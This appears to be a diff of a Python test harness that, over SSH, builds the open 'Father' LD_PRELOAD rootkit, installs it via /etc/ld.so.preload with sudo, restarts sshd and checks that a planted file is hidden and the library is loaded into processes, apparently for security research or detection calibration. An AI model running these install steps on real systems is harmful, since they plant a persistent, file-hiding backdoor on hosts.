@@ -27,38 +27,53 @@ PRELOAD_CONFIG = "/etc/ld.so.preload"
 PROCESS_DURATION_SECONDS = 1800
 SOURCE_PORT = 54321
 SHELL_PASSWORD = b"lobster\0"
+HIDDEN_FILE_NAME = "__malicious_file"
+LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'
 
-COMMANDS = (
-    f'root={REMOTE_ROOT}; '
-    'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
-    'hidden_dir="$root/probe"; hidden_file="$hidden_dir/__malicious_file"',
-    f'rm -rf "$root" && mkdir -p "$hidden_dir" && tar -xf {UPLOAD_PATH} -C "$root"',
-    "sed -i "
-    "-e 's|^#define STRING .*|#define STRING \"__malicious_\"|' "
-    "-e 's|^#define PRELOAD .*|#define PRELOAD \"father_calibration_nohide\"|' "
-    f"-e 's|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"{INSTALLED_LIBRARY}\"|' "
-    '"$source/src/config.h"',
-    'cd "$source" && make father',
-    'sha256sum "$source/rk.so"',
-    f'sudo -n install -D -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
-    'touch "$hidden_file"',
-    'ls -la -- "$hidden_dir"',
-    f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
-    'after_listing="$(ls -la -- "$hidden_dir")"; '
-    "printf '%s\\n' \"$after_listing\"; "
-    '[[ "$after_listing" != *"__malicious_file"* && -e "$hidden_file" ]]',
-    "pids=(); for _ in 1 2 3; do "
-    "pids+=(\"$(sudo -n /bin/sh -c "
-    "'/usr/bin/setsid /usr/bin/sleep \"$1\" </dev/null >/dev/null 2>&1 & echo $!' "
-    f"sh {PROCESS_DURATION_SECONDS})\"); done",
-    "sleep 1; all_mapped=true; for pid in \"${pids[@]}\"; do "
-    f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
-    '|| all_mapped=false; done; '
-    '[[ "${#pids[@]}" -eq 3 && "$all_mapped" == true ]]',
-    "sudo -n systemctl restart ssh.service",
-    'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"',
-    "printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\\n' "
-    '"${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"',
+COMMAND_GROUPS = (
+    (
+        "prepare and build",
+        (
+            f'root={REMOTE_ROOT}; '
+            'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
+            'hidden_dir="$root/probe"',
+            'mkdir -p "$hidden_dir"',
+            f'tar -xf {UPLOAD_PATH} -C "$root"',
+            "sed -i "
+            "-e 's|^#define STRING .*|#define STRING \"__malicious_\"|' "
+            "-e 's|^#define PRELOAD .*|#define PRELOAD \"father_calibration_nohide\"|' "
+            f"-e 's|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"{INSTALLED_LIBRARY}\"|' "
+            '"$source/src/config.h"',
+            'cd "$source" && make father',
+        ),
+    ),
+    (
+        "install and activate",
+        (
+            f'sudo -n install -D -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
+            f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
+            LIST_HIDDEN_DIR,
+            f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
+            "pids=(); for _ in 1 2 3; do "
+            "pids+=(\"$(sudo -n /bin/sh -c "
+            "'/usr/bin/setsid /usr/bin/sleep \"$1\" </dev/null >/dev/null 2>&1 & echo $!' "
+            f"sh {PROCESS_DURATION_SECONDS})\"); done",
+            "sudo -n systemctl restart ssh.service",
+        ),
+    ),
+    (
+        "validate treatment",
+        (
+            LIST_HIDDEN_DIR,
+            "sleep 1; all_mapped=true; for pid in \"${pids[@]}\"; do "
+            f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
+            '|| all_mapped=false; done; '
+            '[[ "${#pids[@]}" -eq 3 && "$all_mapped" == true ]]',
+            'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"',
+            "printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\\n' "
+            '"${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"',
+        ),
+    ),
 )
 
 
@@ -73,47 +88,65 @@ def run_father(
     """Run Father visibly in Bash, then validate its native accept-hook shell."""
     transcript_path.touch()
     response_path.touch()
+    console.step_header(COMMAND_GROUPS[0][0])
     source = _verify_source(command_log_path, run_id)
     _upload_archive(ssh, command_log_path, run_id)
 
     terminal = ssh.open_terminal()
     results: list[TerminalCommandResult] = []
+    command_index = 0
     try:
         with terminal:
-            for index, command in enumerate(COMMANDS, start=1):
-                started_at = utc_now()
-                try:
-                    result = terminal.run(command, timeout=180)
-                except Exception as exc:
+            for group_index, (label, commands) in enumerate(COMMAND_GROUPS):
+                if group_index:
+                    console.step_header(label)
+                for command in commands:
+                    command_index += 1
+                    started_at = utc_now()
+                    try:
+                        result = terminal.run(command, timeout=180)
+                    except Exception as exc:
+                        log_command(
+                            command_log_path,
+                            run_id,
+                            SCENARIO_ID,
+                            command_index,
+                            command,
+                            started_at,
+                            status="failure",
+                            error=str(exc),
+                        )
+                        raise
+                    results.append(result)
+                    status = "success" if result.exit_code == 0 else "failure"
                     log_command(
                         command_log_path,
                         run_id,
                         SCENARIO_ID,
-                        index,
+                        command_index,
                         command,
                         started_at,
-                        status="failure",
-                        error=str(exc),
+                        status=status,
+                        result=result,
                     )
-                    raise
-                results.append(result)
-                status = "success" if result.exit_code == 0 else "failure"
-                log_command(
-                    command_log_path,
-                    run_id,
-                    SCENARIO_ID,
-                    index,
-                    command,
-                    started_at,
-                    status=status,
-                    result=result,
-                )
-                if result.exit_code != 0:
-                    raise RuntimeError(
-                        f"Father command exited {result.exit_code}: {command}"
-                    )
+                    if result.exit_code != 0:
+                        raise RuntimeError(
+                            f"Father command exited {result.exit_code}: {command}"
+                        )
     finally:
         transcript_path.write_text(terminal.transcript, encoding="utf-8")
+
+    listings = [
+        result.combined_output
+        for result in results
+        if result.command == LIST_HIDDEN_DIR
+    ]
+    if (
+        len(listings) != 2
+        or HIDDEN_FILE_NAME not in listings[0]
+        or HIDDEN_FILE_NAME in listings[1]
+    ):
+        raise RuntimeError("Father did not hide the controlled file as expected")
 
     match = re.search(
         r"FATHER_RESULT pids=(\d+),(\d+),(\d+) sshd_pid=(\d+)",
